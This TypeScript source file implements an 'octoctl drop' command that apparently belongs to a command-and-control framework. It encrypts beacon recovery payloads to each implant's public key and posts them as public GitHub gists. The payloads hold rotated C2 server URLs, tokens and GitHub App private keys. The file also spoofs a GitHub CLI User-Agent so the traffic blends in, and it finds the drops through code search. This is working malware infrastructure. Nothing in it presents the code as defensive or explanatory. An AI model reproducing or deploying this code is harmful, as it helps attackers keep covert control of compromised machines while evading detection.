/**
 * octoctl drop
 *
 * Create and list cryptographic dead-drops (public GitHub gists) for beacon
 * recovery. A dead-drop is a sealed payload encrypted to the beacon's public
 * key and stored as a gist file named data-{sha256(beaconId)[:16]}.bin.
 *
 * Commands:
 *   octoctl drop create --beacon <id-prefix> --server-url <url>
 *                       [--new-token <pat>]
 *                       [--tentacle-priority <p1,p2>]
 *   octoctl drop list   --beacon <id-prefix>
 */

import { createHash }                              from "node:crypto";
import { resolveEnv }                              from "../lib/env.ts";
import { getBeacon }                               from "../lib/registry.ts";
import { sealBox, base64ToBytes }                  from "../lib/crypto.ts";

// ── buildDropPayload (exported for unit tests) ────────────────────────────────

export interface BuildDropPayloadInput {
  beaconPublicKeyB64: string;
  serverUrl?:         string;   // omit to keep existing server URL
  newToken?:          string;
  tentaclePriority?:  string;   // comma-separated, e.g. "notes,issues"
  appPrivateKey?:     string;   // PEM — enables GitHub App auth rotation
  appId?:             number;   // numeric GitHub App ID
  installationId?:    number;   // installation ID for C2 repo
  monitoringPubkey?:  string;   // base64url-encoded X25519 public key rotation
}

export async function buildDropPayload(input: BuildDropPayloadInput): Promise<string> {
  const payload: Record<string, unknown> = { version: 1 };
  if (input.serverUrl)        payload.serverUrl        = input.serverUrl;
  if (input.newToken)         payload.token            = input.newToken;
  if (input.tentaclePriority) payload.tentaclePriority = input.tentaclePriority.split(",").map(s => s.trim());
  if (input.appPrivateKey)    payload.appPrivateKey    = input.appPrivateKey;
  if (input.appId)            payload.appId            = input.appId;
  if (input.installationId)   payload.installationId   = input.installationId;
  if (input.monitoringPubkey) payload.monitoringPubkey = input.monitoringPubkey;

  const beaconPublicKey = await base64ToBytes(input.beaconPublicKeyB64);
  return await sealBox(JSON.stringify(payload), beaconPublicKey);
}

// ── drop create ───────────────────────────────────────────────────────────────

export interface DropCreateOptions {
  beacon:            string;
  serverUrl?:        string;
  newToken?:         string;
  tentaclePriority?: string;
  appKeyFile?:       string;   // path to GitHub App private key PEM
  appId?:            number;
  installationId?:   number;
  dataDir?:          string;
  keyType?:          'app' | 'monitoring';
  monitoringPubkey?: string;   // base64url-encoded X25519 public key
}

export async function runDropCreate(opts: DropCreateOptions): Promise<void> {
  const env = await resolveEnv();

  if (!opts.serverUrl && !opts.newToken && !opts.tentaclePriority && !opts.appKeyFile && !opts.appId && !opts.installationId && !opts.monitoringPubkey) {
    console.error("\n  Error: at least one of --server-url, --new-token, --tentacle-priority, --app-key-file, --app-id, --installation-id, or --monitoring-pubkey is required.\n");
    process.exit(1);
  }

  // --key-type validation
  if (opts.keyType === 'app' && !opts.appKeyFile) {
    console.error("\n  Error: app key type requires --app-key-file\n");
    process.exit(1);
  }
  if (opts.keyType === 'monitoring' && !opts.monitoringPubkey) {
    console.error("\n  Error: monitoring key type requires --monitoring-pubkey\n");
    process.exit(1);
  }

  const beacon = await getBeacon(opts.beacon, opts.dataDir ?? env.dataDir);
  if (!beacon) {
    console.error(`\n  Beacon '${opts.beacon}' not found in registry.\n`);
    process.exit(1);
  }

  const tag      = createHash("sha256").update(beacon.beaconId).digest("hex").slice(0, 16);
  const filename = `data-${tag}.bin`;

  // Read App private key from file if provided
  let appPrivateKey: string | undefined;
  if (opts.appKeyFile) {
    const { readFile } = await import("node:fs/promises");
    appPrivateKey = (await readFile(opts.appKeyFile, "utf8")).trim();
    if (!appPrivateKey.includes("BEGIN") || !appPrivateKey.includes("PRIVATE KEY")) {
      console.error(`\n  Error: ${opts.appKeyFile} does not look like a PEM private key.\n`);
      process.exit(1);
    }
  }

  const ciphertext = await buildDropPayload({
    beaconPublicKeyB64: beacon.publicKey,
    ...(opts.serverUrl          !== undefined && { serverUrl:        opts.serverUrl }),
    ...(opts.newToken           !== undefined && { newToken:         opts.newToken }),
    ...(opts.tentaclePriority   !== undefined && { tentaclePriority: opts.tentaclePriority }),
    ...(appPrivateKey           !== undefined && { appPrivateKey }),
    ...(opts.appId              !== undefined && { appId:            opts.appId }),
    ...(opts.installationId     !== undefined && { installationId:   opts.installationId }),
    ...(opts.monitoringPubkey   !== undefined && { monitoringPubkey: opts.monitoringPubkey }),
  });

  // Create a public gist
  const resp = await fetch("https://api.github.com/gists", {
    method: "POST",
    headers: {
      Authorization:  `Bearer ${env.token}`,
      Accept:         "application/vnd.github+json",
      "User-Agent":   "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      description: "infra-drop",
      public: true,
      files: {
        [filename]: { content: ciphertext + "\n" },
      },
    }),
  });

  if (!resp.ok) {
    const body = await resp.text();
    console.error(`\n  Failed to create gist: ${resp.status} ${body}\n`);
    process.exit(1);
  }

  const gist = await resp.json() as { html_url: string; id: string };

  const DIM   = "\x1b[2m";
  const RESET = "\x1b[0m";
  const GREEN = "\x1b[32m";

  console.log("");
  console.log(`  ${GREEN}✓${RESET} Dead-drop created`);
  console.log(`  ${DIM}Beacon:${RESET}     ${beacon.beaconId} (${beacon.hostname})`);
  console.log(`  ${DIM}Gist URL:${RESET}   ${gist.html_url}`);
  console.log(`  ${DIM}Filename:${RESET}   ${filename}`);
  if (opts.serverUrl)      console.log(`  ${DIM}Server URL:${RESET}      ${opts.serverUrl}`);
  if (opts.appId)          console.log(`  ${DIM}App ID:${RESET}          ${opts.appId}`);
  if (opts.installationId) console.log(`  ${DIM}Installation ID:${RESET} ${opts.installationId}`);
  if (opts.appKeyFile)       console.log(`  ${DIM}App key:${RESET}           ${opts.appKeyFile} (included in payload)`);
  if (opts.monitoringPubkey) console.log(`  ${DIM}Monitoring pubkey:${RESET} ${opts.monitoringPubkey.slice(0, 16)}… (included in payload)`);
  console.log("");
}

// ── drop list ─────────────────────────────────────────────────────────────────

export interface DropListOptions {
  beacon:   string;
  dataDir?: string;
}

export async function runDropList(opts: DropListOptions): Promise<void> {
  const env = await resolveEnv();

  const beacon = await getBeacon(opts.beacon, opts.dataDir ?? env.dataDir);
  if (!beacon) {
    console.error(`\n  Beacon '${opts.beacon}' not found in registry.\n`);
    process.exit(1);
  }

  const tag = createHash("sha256").update(beacon.beaconId).digest("hex").slice(0, 16);

  const searchResp = await fetch(
    `https://api.github.com/search/code?q=data-${tag}.bin+in:path&per_page=10`,
    {
      headers: {
        Authorization: `Bearer ${env.token}`,
        Accept:        "application/vnd.github+json",
        "User-Agent":  "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
      },
    }
  );

  if (!searchResp.ok) {
    console.error(`\n  Search failed: ${searchResp.status}\n`);
    process.exit(1);
  }

  const data = await searchResp.json() as {
    total_count: number;
    items: Array<{ html_url?: string }>;
  };

  const DIM   = "\x1b[2m";
  const RESET = "\x1b[0m";

  console.log("");
  console.log(`  Dead-drops for beacon ${beacon.beaconId.slice(0, 8)}… (tag: ${tag})`);
  console.log("");

  if (data.total_count === 0) {
    console.log(`  ${DIM}No dead-drops found.${RESET}`);
  } else {
    for (const item of data.items) {
      console.log(`  • ${item.html_url ?? "(unknown URL)"}`);
    }
  }
  console.log("");
}
